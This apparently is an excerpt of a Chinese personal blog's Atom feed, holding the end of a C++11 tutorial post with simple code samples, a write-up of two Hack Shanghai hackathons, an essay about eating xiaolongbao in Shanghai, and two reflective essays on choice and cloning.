<h2 id="u59D4_u6258_u6784_u9020_u51FD_u6570"><a href="#u59D4_u6258_u6784_u9020_u51FD_u6570" class="headerlink" title="委托构造函数"></a>委托构造函数</h2><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Student(<span class="keyword">int</span> i, string n): id(i), name(n)&#123;&#125;</span><br><span class="line">    Student(): Student(0, <span class="string">"none"</span>)&#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    string name;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>之前一直需要抽出公共的构造部分，有了委托后可以更加高效，因为在初始化列表中便初始化成员了。</p>
<h1 id="u65B0_u7279_u6027"><a href="#u65B0_u7279_u6027" class="headerlink" title="新特性"></a>新特性</h1><h2 id="Lambda_u8868_u8FBE_u5F0F"><a href="#Lambda_u8868_u8FBE_u5F0F" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><p>其实在上文中已经使用过了一些，形如：<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="link_label">闭包捕捉</span>](<span class="link_url">参数列表</span>) -&gt; 返回值类型 &#123;函数体&#125;</span><br><span class="line">[](int a, double b) -&gt; double &#123;return a+b;&#125;</span><br></pre></td></tr></table></figure></p>
<p>闭包是指在表达式中可以直接访问到表达式创建时的上下文中的变量，这样可以将特定的参数封在表达式内，调用时更加简洁。<br>在Javascript中，我们可以直接闭包。C++中区分了传值和传引用，所以我们必须通过[]来显式地捕捉外界的变量。<br>规则比较简单，<code>[=]</code>便是传值所有使用的外界变量；<code>[&amp;]</code>传引用；<code>[&amp;,x]</code>表示x传值，其他传引用；<code>[=,&amp;y]</code>表示y传递，其他传值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">100</span>, b = <span class="number">10</span>;</span><br><span class="line"><span class="comment">// auto 在这里很方便，-&gt;double也可以省去，可以被编译器自动推导</span></span><br><span class="line"><span class="keyword">auto</span> ff = [=](<span class="keyword">int</span> x, <span class="keyword">double</span> y) -&gt;<span class="keyword">double</span> &#123;<span class="keyword">return</span> a+b+x + y;&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%f\n"</span>, ff(<span class="number">1</span>, <span class="number">2.2</span>));</span><br></pre></td></tr></table></figure>
<p>在使用标准库的高阶函数时，便可以使用函数表达式，省去了函数的申明和需要闭包的变量之前不方便传递的问题。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">for_each(nums.begin(), nums.end(), [&amp;sum](<span class="keyword">int</span> a)&#123;sum+=a;&#125;);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, sum);</span><br></pre></td></tr></table></figure></p>
<p>Javascript中非常常见的立即调用表达式。<br><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="collection">[]</span> <span class="collection">&#123; printf<span class="list">(<span class="string">"Hi\n"</span>)</span><span class="comment">; &#125; ();</span></span><br><span class="line"><span class="collection">[]</span><span class="list">(<span class="keyword"><span class="built_in">int</span></span> i)</span> <span class="collection">&#123; printf<span class="list">(<span class="string">"Hi%d\n"</span>, i)</span><span class="comment">; &#125; (100);</span></span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="u53F3_u503C_u5F15_u7528"><a href="#u53F3_u503C_u5F15_u7528" class="headerlink" title="右值引用"></a>右值引用</h2><p><a href="http://harttle.com/2015/10/11/cpp11-rvalue.html" target="_blank" rel="external">详细的介绍可参考这里</a>，写得很详细。 </p>
<p>这个右值引用应该还是很好的特性。不过需要使用者明白自己究竟在做什么，主要是减少了同类中的一些冗余的拷贝过程。<br>不过我们当时的争论在于如果只是使用指针，也可以达到同样的效果，不过这里便没有类的封装性了，标准库也没办法通过<code>move</code>告知进行内部成员的移动。不过使用智能指针应该是可以达到同样的效果。<br>当时还认为如果内部变量是new获得的，应该自行管理不能传递，不过我认为这里的管理都是在同类型中间进行，传递也只是同类的实例传递给另外一个同类，所以管理是封闭在类的内部的，是符合自行管理new创造的对象的。</p>
<h2 id="u5143_u7EC4"><a href="#u5143_u7EC4" class="headerlink" title="元组"></a>元组</h2><p>可以用来返回多个返回值。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::tuple&lt; <span class="keyword">int</span> , <span class="keyword">double</span>, <span class="built_in">string</span>       &gt; tuple_1;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::tuple&lt; <span class="keyword">char</span>, <span class="keyword">short</span> , <span class="keyword">const</span> <span class="keyword">char</span> * &gt; tuple_2;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    tuple_1 t1;</span><br><span class="line">    tuple_2 t2 &#123;<span class="string">'X'</span>, <span class="number">2</span>, <span class="string">"Hola!"</span>&#125;; <span class="comment">// ()或是&#123;&#125;初始化都可以，不过建议使用新的&#123;&#125;统一初始化</span></span><br><span class="line">    t1 = t2 ; <span class="comment">// 第三个字串元素可由'const char *'隐式转换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>摘自Wikipedia。</p>
<h1 id="u589E_u5F3A_u7684_u6807_u51C6_u5E93"><a href="#u589E_u5F3A_u7684_u6807_u51C6_u5E93" class="headerlink" title="增强的标准库"></a>增强的标准库</h1><h2 id="u5E76_u53D1_u5E93_uFF08_u7EBF_u7A0B_u3001_u9501_u3001_u539F_u5B50_u64CD_u4F5C_uFF09"><a href="#u5E76_u53D1_u5E93_uFF08_u7EBF_u7A0B_u3001_u9501_u3001_u539F_u5B50_u64CD_u4F5C_uFF09" class="headerlink" title="并发库（线程、锁、原子操作）"></a>并发库（线程、锁、原子操作）</h2><h2 id="u6B63_u5219_u8868_u8FBE_u5F0F_u5E93"><a href="#u6B63_u5219_u8868_u8FBE_u5F0F_u5E93" class="headerlink" title="正则表达式库"></a>正则表达式库</h2><h2 id="u901A_u7528_u667A_u80FD_u6307_u9488"><a href="#u901A_u7528_u667A_u80FD_u6307_u9488" class="headerlink" title="通用智能指针"></a>通用智能指针</h2><h2 id="u6563_u5217_u8868"><a href="#u6563_u5217_u8868" class="headerlink" title="散列表"></a>散列表</h2><h2 id="u968F_u673A_u6570_u751F_u6210"><a href="#u968F_u673A_u6570_u751F_u6210" class="headerlink" title="随机数生成"></a>随机数生成</h2><h2 id="u53D8_u957F_u53C2_u6570_u6A21_u677F"><a href="#u53D8_u957F_u53C2_u6570_u6A21_u677F" class="headerlink" title="变长参数模板"></a>变长参数模板</h2><h2 id="u591A_u6001_u51FD_u6570_u5BF9_u8C61_u5305_u88C5_u5668"><a href="#u591A_u6001_u51FD_u6570_u5BF9_u8C61_u5305_u88C5_u5668" class="headerlink" title="多态函数对象包装器"></a>多态函数对象包装器</h2><h1 id="u5176_u4ED6"><a href="#u5176_u4ED6" class="headerlink" title="其他"></a>其他</h1><p>最近希望做到动态的、有不同函数签名的函数的动态调用，后来只能使用switch case实现。<br>看到C++17标准中有一个<code>invoke</code>，似乎是动态地通过参数列表调用一个<code>callable</code>对象，也许以后还会加入GC和reflect。</p>
<p><a href="https://zh.wikipedia.org/wiki/C%2B%2B11" target="_blank" rel="external">更多改动可参考Wikipedia</a><br><a href="http://coolshell.cn/articles/5265.html" target="_blank" rel="external">Coolshell</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>我学的第一门语言便是C++，不过由于后期一直没有使用C++写过较大的项目，一直处于入门阶段。最近实习，第一个小项目便是搭建一个代理服务器，Manager处于对性能的要求，希望我用C++实现。当时比较懒，觉得用C++重写代理服务器进展会比较慢，便说服Manager让我使用Go]]>
    </summary>
    
      <category term="cpp" scheme="http://yqf3139.github.io/tags/cpp/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Hack Shanghai 体验 2015]]></title>
    <link href="http://yqf3139.github.io/2015/11/09/hackshanghai-2015/"/>
    <id>http://yqf3139.github.io/2015/11/09/hackshanghai-2015/</id>
    <published>2015-11-09T11:18:56.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p><img src="/images/hackshanghai-2015/logo_purple.png" alt="hackshanghai"></p>
<h2 id="u4EC0_u4E48_u662FHackathon_uFF1F"><a href="#u4EC0_u4E48_u662FHackathon_uFF1F" class="headerlink" title="什么是Hackathon？"></a>什么是Hackathon？</h2><p>产品/服务开发需要耗费大量的人力，但经常一个很好的商业模式或是产品，都萌发自一两个人的小小想法，短时间内拿出一个Prof of Concept的原型，去证明你的想法，发现问题非常重要。</p>
<p>Hackathon就是程序员集中在一起，快速进行ideas 2 reality的活动，并且相互交流的过程。它通常由一个主办者发起，有大量的赞助商支持，通过严格的条件，比如限定24小时完成，限定方向和开发平台，来筛选出优秀的想法和开发者。当然，作为回报，Hackathon通常有优厚的奖品或是实习机会来吸引活跃的程序员。</p>
<p>应该来说每人都会经历自己的Hackathon，这个并不仅仅是软件行业。当你产生一个想法，并且你特别希望bring it to reality的时候，一次Hackathon就开始了。时间有长有短，可以是任何事情。</p>
<p>这一过程中的各个阶段：初期想法的产生，具体化细节，寻找合作伙伴，交流，推广，获取到别人的支持，反思评价都很有意思。其中还夹杂着很多情绪，兴奋，喜悦，妥协，各种压力，都会在短短的限定时间内爆发。走下去不放弃是必须的，当然这并不包括发现自己的想法不能实现，如果是这样，那你至少证明了它没有意义，或是有几个世界级的瓶颈。</p>
<p>所以大家都应该抓住机会参加一次Hackathon，能从这一过程和各种人身上学到很多，也能接触到很多新的平台和技术。</p>
<h2 id="Hack_Shanghai_2014"><a href="#Hack_Shanghai_2014" class="headerlink" title="Hack Shanghai 2014"></a>Hack Shanghai 2014</h2><p>2014年的11月初，我和颢神、苗姐、冰神等在参加完软创大赛后，直接飞来上海，和姚神碰面参加Hack Shanghai 2014。想法在去之前有所讨论，但仍然不够清晰，是从我一个小小的技术尝试萌发的。</p>
<p>我们希望提升现有的网页视频播放的体验。通过定制化的界面，用户看到的是一个聚合好的视频库，资源来自各大视频网站。再通过智能手机充当遥控器，你便可以舒服得靠在沙发上，通过滑动屏幕、挥动手机进行视频的，进度拖动等操作。</p>
<p>经历了24小时的鏖战（睡了不到三小时），我们达到预期的效果了。姚神交互界面非常酷炫，颢神将各大视频站的资源破解使用，苗姐制作了美工并且准备了制胜法宝——PPT，我则开发Android上的遥控器，将触屏和加速度的数据处理后发到浏览器中控制视频。</p>
<p>第一次通宵熬夜，早上六七点时异常的难受。不过姚神一夜没睡，仍在战斗。随着代码合并，产品成型，效果超出了我们的预期。<br>产品展示环节我们站在自己的Booth旁边，不断向旁人展示我们的应用，其他组的产品创意也很好，有利用pebble手表进行阅读的应用，通过不断改变显示的文字，人眼可以在一个小屏幕上面舒适地阅读文章。<br>还有利用Leap Motion做厨房教学应用的点子，在hackathon上，很多硬件产品可以租借，利用一个全新的平台做出应用，这是开发商非常希望看到的。</p>
<p>被选入前九后，也就意味着我们要在评委和所有的250个Hacker面前再展示一次。姚哥进行了产品的阐述，我在一旁demo，效果很赞，评委们也很有兴趣地问了我们一些技术实现细节。</p>
<p><img src="/images/hackshanghai-2015/1.png" alt="hackshanghai"></p>
<p><img src="/images/hackshanghai-2015/2.png" alt="hackshanghai"></p>
<p>打开youku就能看到一个更好的视频界面。视频浏览页面，可以左右滑动。</p>
<p>上海纽约大学的确让第一届Hackathon Shanghai成为了现实，中国和外国志愿者们都非常热心，<br>最后我们拿到了很不错的奖品，一行五人，去人民广场开心地吃了顿日料，返程回校。</p>
<h2 id="Hack_Shanghai_2015"><a href="#Hack_Shanghai_2015" class="headerlink" title="Hack Shanghai 2015"></a>Hack Shanghai 2015</h2><p>由于正好在上海实习，我便和冰神、火只和苗姐组队，再一次踏上hackathon之旅。</p>
<p>这次前期我们设想了很多Leap Motion的应用。</p>
<ul>
<li>进行数据可视化的互动，将一份金融或是教育领域的数据进行可视化，通过Leap Motion，利用手来与数据进行三维的互动，并且多人协同，可以共同编辑一份数据。</li>
<li>或是用两根手指进行足球对抗赛，两只手指可以控制前进、后退或是射门，另外一只手可以控制奔跑的方向，也是可以在网页上进行多人的对抗。</li>
<li>或是两根手指滑雪，进行神庙逃亡等等。</li>
</ul>
<p>还有一些稀奇古怪的想法，</p>
<ul>
<li>利用Leap Motion教会你正确的刷牙姿势。不过一个Leap Motion似乎难以进行脸和手的相对位置的定位，由于手头没有Leap Motion，以后可以试试是否可行。我脑洞一开，觉得可以弄棍子穿着Leap Motion进行模拟刷牙，这样它捕捉的人脸的一部分应该足以计算出他们的相对位置。不过也难以进行尝试和实现。</li>
<li>多人工作时候的协作，需求还不太明确。</li>
<li>用头部姿态玩一些汽车的姿态控制游戏（画面太美）。</li>
<li>任意网页弹幕。通过架设一个私人服务器，让在多地的相互认识的人能愉快的在同一个网页上弹幕，可以是小说，视频等等，还可以同步播放进度，发射弹幕聊天，自动进行鼠标位置的告知，对某些网页内容进行涂鸦，一个很好的应用便是异地的情侣，他们可以共同观看一个电影等，当然还可以加上实时的语音功能，不过得过滤掉网页上的媒体声音。</li>
</ul>
<p>开幕式后，我们便继续讨论比较中意的Leap Motion应用，可是后来并没有借到Leap Motion。后来发现图灵机器人提供的Api还比较有趣的，它号称人工智能，能够进行情感的理解和表达。</p>
<p>我们最终做了Robot T，想做一个Web浏览器上的Google Now on Tap，<br>大致想法是让图灵机器人阅读你正在阅读的内容，像是一个你信任的好朋友站在身边，和你一起浏览。</p>
<p><img src="/images/hackshanghai-2015/3.png" alt="hackshanghai"><br><img src="/images/hackshanghai-2015/4.png" alt="hackshanghai"><br><img src="/images/hackshanghai-2015/5.png" alt="hackshanghai"><br><img src="/images/hackshanghai-2015/9.png" alt="hackshanghai"><br>比如知乎闲逛的时候，它会对你关注的问题主动地提出自己的看法，也许能惊艳到你。</p>
<p><img src="/images/hackshanghai-2015/8.png" alt="hackshanghai"><br>或者你滑词提示它阅读一些内容。</p>
<p><img src="/images/hackshanghai-2015/6.png" alt="hackshanghai"><br>他会在你午餐时间，基于你浏览的餐馆信息，向你推荐菜谱和餐馆。</p>
<p><img src="/images/hackshanghai-2015/7.png" alt="hackshanghai"><br>告示天气变化。</p>
<p>还有比如在你进行理财的时候，主动告诉你一些你可能会感兴趣的经济信息。</p>
<p>不过图灵机器人很多方面做得还是不如百度小度机器人，希望他们继续努力吧。</p>
<p>实现过程同样艰苦，我们奋斗到三点，终于熬不住去三楼找了个沙发躺了四个小时。早上起来的时候各种不好，不过还好没喝红牛，苗姐提示它含有激素。</p>
<p>本次的演示只有三分钟，三个外国教授进行评价。应该来说评委对我们的产品思想比较感兴趣，不过由于图灵机器人只能理解中文，我们只做了中文知乎和工商银行的网页的自动阅读和提示。</p>
<p>实现过程中我也有所失误，好长时间没写UI，抓耳挠腮写不出好看的，还好火只后期帮忙。<br>还有就是过于重视实现了，展现效果却比较差。使用者无法瞬间get这个应用的point。<br>和外国教授交流的时候也深深感受到了自己口语的拙技。</p>
<p>本次还看到了几个不错的项目。</p>
<ul>
<li>两人协同的平衡球游戏。看了知乎回答，的确24小时实现不简单。两个人协作让一个小球滚入洞中。你可以把一个小球从一个手机倒入另一个。由于手机的相对位置还可以移动，他们需要解决利用两个手机的传感器进行相对位置的计算。Web实现，微信分享链接就能一起玩，关卡设置花样很多，如果推广一下能火。</li>
<li>一个利用Leap Motion让很多传感器上方的区域变成可点击的区域。比如上面摆着几本书，便可以选中其中一本。不过其实有点杀鸡用牛刀了。他们对使用场景还进了商业化的设想。团队四人来自清华，队长非常积极和健谈。和上海纽约大学的一位多媒体实验室的老师谈一些人机交互的技术。老师拿出了一个Project Tango设备进行展示。队长口语非常不错。</li>
<li>还有一个是一个Chrome扩展，能在你百度搜索一些电影的时候，将背景变为trailer进行展示，效果很震撼，估计百度前段要哭了。不过视频的加载需要时间，内容需要提前分发到浏览器本地缓存。他们还做了很多的商业设想，我很佩服，虽然短时间内没办法全部实现展示，但这个意识非常好。</li>
</ul>
<p>今天看了相关的知乎问题，共同经历了过hackathon，通过其他Hacker的心路历程，我们也能学到很多。<br><a href="http://www.zhihu.com/question/37271008" target="_blank" rel="external">http://www.zhihu.com/question/37271008</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/images/hackshanghai-2015/logo_purple.png" alt="hackshanghai"></p>
<h2 id="u4EC0_u4E48_u662FHackathon_uFF1F"><a href="#u4EC0_u4]]>
    </summary>
    
      <category term="hackathon" scheme="http://yqf3139.github.io/tags/hackathon/"/>
    
      <category term="flood" scheme="http://yqf3139.github.io/categories/flood/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[美味小笼包]]></title>
    <link href="http://yqf3139.github.io/2015/11/04/yummy-xiaolongbao/"/>
    <id>http://yqf3139.github.io/2015/11/04/yummy-xiaolongbao/</id>
    <published>2015-11-04T13:30:05.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p><img src="/images/yummy-xiaolongbao.jpg" alt="小笼包"></p>
<p>我作为一个在南京长大的人，小笼包是没少吃的。我妈单位离刘长兴店近，经常会下班的时候给我带上一笼解馋。<br>我会立即冲去倒醋，立即吃掉其中的两个，剩下的留到第二天作为早餐。一直算不上好好品味过小笼包的滋味，<br>并且近年经常惊讶地发现小笼包在变小，真的是越来越小了，也许是我长大了吧。</p>
<p>所以当Yongnian邀请我们几个实习生吃个午饭，并且是去吃号称上海最好吃的蟹黄小笼包时，我还是小小激动了一把。<br>Yongnian是我们的Manager，他微微发福，能说会道，对待工作拥有极大的热情，这次的借口是为Jie回南京考试践行，并且请我们几个一次。</p>
<p>于是我们一行五人，中午十一点不到就搭上William的车出发了。Yongnian催促我们早点走，说去晚了就吃不到了。</p>
<p>吃不到了，难道有钱不赚？</p>
<p>这家店的确就是这么有性格。一路上Yongnian形容了他上次没吃到招牌小笼包的遗憾。<br>“上次我是周末来的，开车一个多小时，人特别多。他们早上7店开卖，到中午就收摊了，只做一顿。”<br>“他们的主厨原来是城隍庙的店的厨师，后来自己出来单干了，就只在郊外摆个小摊，不为赚钱只为一乐。”</p>
<p>开车20分钟，我们便到了这个小小的旅游景点，小小的店中只有几张桌子，却已经坐满了人。我们站在门口就能闻道蟹黄小笼包的香味，热情的阿姨在人群中忙碌着。<br>我不由得咽下了口水。站在门口看阿姨飞速地包着各色小笼包。</p>
<p>“你们先去景点内转转吧，等会有位置的话叫你们”，Yongnian对我们说。</p>
<p>一个很江南水乡的小景区，但有点开发过度的感觉。我们看着各色小吃，还是想着没入嘴的小笼包。</p>
<p>很快我们就回去点餐了。Yongnian熟练地用上海话点餐，我们在旁边艰难地解码上海方言。我们一共要了六笼各色小笼包。<br>各种小笼包还挺讲究的，编号从1到20多，有用虾仁扇贝等海鲜做的，更多的是蟹粉汤包，更有公蟹膏和母蟹黄配出的龙凤小笼包。<br>我们每人还点了酒酿豆沙汤，和云吞。</p>
<p>慕名而来的食客的确挤爆了这个小小的店铺，我们占据了一张大桌。旁边的食客已经在品尝小笼包了。似乎老年人偏多，看来都是老上海才找得到这种偏门小店。</p>
<p>很快上了三种醋，果醋、姜醋等，阿姨嘱咐我们到时候要听她话，用对应的醋才能品尝到最佳的美味。每人还给倒了一碟新鲜的柠檬酱，据说吃完后一口闷便可以去除蟹的肥腻。<br>我们边喝着提前上的酒酿豆沙汤，边听阿姨介绍各种流程。我旁边已经站好了排队的食客，他们也不急，而是耐心地咨询各色小笼包的特点，Yongnian和他们讨论得不亦乐乎。</p>
<p>正说着小笼包便上了，我们每人手持一个小碟子，舀上对应的醋，小心翼翼的夹起盛满汤汁的小笼包。不知道是手艺好还是蒸的技术高超，<br>每个小笼包被筷子的摩擦力稳稳的提起，不漏出一滴精华。我大概吃的第一个就是招牌的蟹粉小笼包，这是用蟹肉和猪肉混合做的，性价比很高。我往上面又滴了一点醋。<br>然后小心翼翼的用牙去咬这个小小的美味，诶，汤汁流出来了，我赶忙一整个吞下，好烫。我咝着嘴，立马感受到了非常猪肉和蟹肉混合的鲜美。小碟子中的汤汁也被我一饮而尽。</p>
<p>扇贝小笼包和鲜虾小笼包也十分美味，各自像是寿司一样，在包子的褶子处装饰着对应的食材，好看又美味。<br>阿姨说她们当时在日本开店的，她非常标准的说着“chotto matte”，意思是稍等一下。</p>
<p>最后招牌龙凤小笼包上了，一个小笼包中包裹着两只蟹的美味，比单纯吃蟹过瘾。所有的食材都是手工挑出，包括蟹肉，这可能也是她们无法扩张的一个原因吧。</p>
<p>旁边的食客看着我们吃，一个劲得安慰我们慢慢吃，这样才能品出味道。</p>
<p>最后吃的云吞，似乎是从天堂掉入人间。饱腹之后的我们，带着美好的记忆和嘴中柠檬的清香，返回公司继续上班。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="/images/yummy-xiaolongbao.jpg" alt="小笼包"></p>
<p>我作为一个在南京长大的人，小笼包是没少吃的。我妈单位离刘长兴店近，经常会下班的时候给我带上一笼解馋。<br>我会立即冲去倒醋，立即吃掉其中的两个，剩下的留到]]>
    </summary>
    
      <category term="food" scheme="http://yqf3139.github.io/tags/food/"/>
    
      <category term="flood" scheme="http://yqf3139.github.io/categories/flood/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[妄想整理  选择]]></title>
    <link href="http://yqf3139.github.io/2012/07/13/delusion-of-choices/"/>
    <id>http://yqf3139.github.io/2012/07/13/delusion-of-choices/</id>
    <published>2012-07-13T12:12:49.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p>现在寂寞时才发现难逢一人讲讲话。</p>
<p>最近真懒，这才第二篇，也是没头没尾不成系统。</p>
<p>刚才看完几个ted演讲，突然又想起今天看到的讲什么文科女工科男的文章。<br>以前也看到有这样的段子，文科难工科男对掐，互相说对方不懂什么，然后展现自己的特长。故意要分清界限似的。<br>我也得承认，以前我也有这类的思想，感觉班上的某些女生好什么什么，感觉某个人怎么怎么，不过我基本上都一笑了之，不做口头上的表达。<br>大家也都经常会这样，看人不爽两人闹点别扭，吵嘴甚至动动手。天师也有时对某女生的娇气和装萌直接口头表达意见，或比较形象地批评某些人。</p>
<p>依我现在看来，我甚至会对这一切都一笑了之什么都不说了。</p>
<p>为什么呢？因为选择。<br>在我一开始有这种想法时，我会想：这是这个人的各种生理心理因素决定的，由十几年的环境塑造的，在现在这种时空下的一种必然表现，她发嗲，因为她是女生，她受的教育或她的妈妈，姐姐对她的间接影响。他怎么怎么，想想似乎都很顺乎自然，这是他们的选择，虽然不完全是他们自己造成的，但似乎合理不需要干涉。<br>这样一看，似乎社会就很和谐了。不会有冲突了，大家相互理解和平共处。</p>
<p>可是，还需要不断修正这种观点。<br>问题是，我不可能要求人们全用这种观点看问题。不然社会就混乱了，我的观点就不成立了。<br>我忽视了我的主观性，毕竟我不是上帝，我需要有一定的态度。<br>比如说吧，警察如果对犯人都这样，那如何主持正义公道和法律？教师也不能对犯错的学生不管。<br>所以，每个人的对其他的人的态度的选择也很重要。<br>警察对犯人审问，法庭除以公正的判决，这符合我们这个时代的需要与期望。<br>教师对学生教导和鼓励，也是社会的需要与期望，而且也是自身的选择。需要我们的尊敬。除非他不管不顾，而且体罚过分辱骂，那社会对他们是排斥的。</p>
<p>所有我的有时不管不顾的思想也是一种选择，但有些事不能一笑了之。</p>
<p>有时有些事的争吵也不是个人利益，大家都是为了国家社会人类，当然不可避免地会有自己。<br>比如新文化运动的时候，旧思想和新思想的问题。比如一些看似极端的问题，比如一些人提出的极端思想。<br>有人那时说打倒孔家店，我们现在一看就说过了过了，可老师有次提示我们，那时旧思想的影响很大，需要比较极端的思想来冲击。冲击过后，社会会慢慢找到平衡点。<br>那这样来看，我们的确不需要嘲笑一些极端的思想，他们对社会的提示性和维稳性很值得我们肯定，他们需要我们尊敬。就像屈原，想很多看似很极端的人。<br>社会的车轮总是向前，有时候看似后退也在螺旋上升。<br>社会的天平很是公平，有时你费心好意说给人家不听的话，以后命运会教会他理解。</p>
<p>这么看，上帝这么多年的不管不顾就是他的选择。挺聪明的。<br>不过统治者想无为而治不太可能长久，因为我们毕竟是人。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>现在寂寞时才发现难逢一人讲讲话。</p>
<p>最近真懒，这才第二篇，也是没头没尾不成系统。</p>
<p>刚才看完几个ted演讲，突然又想起今天看到的讲什么文科女工科男的文章。<br>以前也看到有这样的段子，文科难工科男对掐，互相说对方不懂什么，然后展现自己的特长。故意要]]>
    </summary>
    
      <category term="delusion" scheme="http://yqf3139.github.io/categories/delusion/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[妄想整理  克隆]]></title>
    <link href="http://yqf3139.github.io/2012/06/28/delusion-of-clone/"/>
    <id>http://yqf3139.github.io/2012/06/28/delusion-of-clone/</id>
    <published>2012-06-28T05:07:40.000Z</published>
    <updated>2015-12-12T02:56:44.615Z</updated>
    <content type="html"><![CDATA[<p>开始由一些奇怪的话题写一下自己的妄想。</p>
<p>【克隆】<br>报纸上的姐妹花考到相同的分，人们习惯以双胞胎的心灵感应来解释。不过似乎没有一种可靠的解释来说明或应用，不过如果能有那是很好。</p>
<p>以前讲到克隆技术，我一般都很兴奋。克隆是一个旧的概念，原意是复制。</p>
<p>的确，世界有很多克隆的现象。它维护了一定时空下的稳定，和变异一起和谐地推动发展。</p>
<p>为了让这个话题有意思一点，我们来说克隆人。</p>
<p>克隆的实物物体很常见，一般人都希望你买的电子产品最好和广告上说的一样好，产品品质要保证同样高就需要做完美的拷贝。所以流水线作业生产的产品品质相近，表现能力也一样，对外界的反映也几乎相同。</p>
<p>当然每个人的手机又不同，因为你对它倾注了时间与精力，它就是你的手机。当然在数字化的时代，电子产品的不同是可以很好的量化的，所以备份和云存储可以让你瞬间把其他的同型号手机变成你自己的。不过一般的产品不那么容易同步，所以人们很留念以前自己使用过的东西。</p>
<p>不过我们也追求个性化与小众，产品的特殊也很受关注，比如各种限量的什么什么。而这些，显然显然也是我们熵增的一种渠道。很必须，因为我们人是唯一的。我们不想也不能被同质化，不过现实条件也总是矛盾的。</p>
<p>所以人的克隆很复杂，其他的生物与非生物也不简单，稍微容易一点。</p>
<p>人是什么？是一堆物质的集合吗，肯定不是。人不是一堆物质的混合，而是有特定结构顺序的。比如我们的基因基本决定了我们长什么样，可能还有很多很多。</p>
<p>人还具有碎片性，你并不完全在“你”里面，你还在其他人心中有碎片化的镜像。相同地，你也包含了很多很多人的碎片，宽泛地说，要想有一个你，这世界所有的都不可缺少，当然这一般没有实用意义。</p>
<p>有了基因你就能完全克隆出一个人吗？可能，不过那是生物学意义上的，而社会学上这又要麻烦很多。</p>
<p>所以其实克隆技术还只是浅层次的拷贝，不过由于一般很难处理伦理关系，也有很多人权的问题，我们并不支持。</p>
<p>有些纳粹分子想复活希特勒，但那是不可能的。他们选取希特勒的基因培育儿童，进行教导，还原希特勒的生活背景，但社会大背景变了。并且从蝴蝶效应我们知道，一点点初始变量的改变，在复杂的系统中长时间会造成很大的差异。何况是人这么复杂的生物，怎么能做到完全的相似。</p>
<p>所以小说中社会背景很重要。背景影响人，人反映背景。</p>
<p>好吧，我现在想要克隆一个人，那怎么办。那就在某一个时刻，对某一个人全部地进行分子量级的扫描，而后就在那个时刻，进行分子化的重建，并且和那个本体同时被唤醒，并且没有人知道谁是谁，那才是接近完美的，也是不可做到的。不过其他的小非生物东西应该还有可能。数据量，科技什么的都是限制。</p>
<p>但让我们来看看这个大自然给我们的礼物–同卵双生的双胞胎。</p>
<p>太不可思议了，一枚受精卵受了刺激一分为二并且独立生长。就像双星一样。除了先后关系，他们几乎接受了同样的基因，同样的背景，教育，各种外界的反映。</p>
<p>于是我们得到了世界上已经很完美的复制人。不过随着年龄增大与蝴蝶效应，相似程度会降低，不过人做不到大自然如此的完美，而又合乎伦理。至少是现在的伦理。</p>
<p>所以他们对同一件事情作出相同的反应并不足为奇。跟电子产品有点类似。</p>
<p>不过人们觉得很美好，虽然是同质化，但很不常见。</p>
<p>小猫小狗的克隆也是如此，世界上你是我的唯一。除非分子克隆，不然它不是它。</p>
<p>就算分子克隆出了一个一个原子都不多不少的你的宠物，它也不是它。</p>
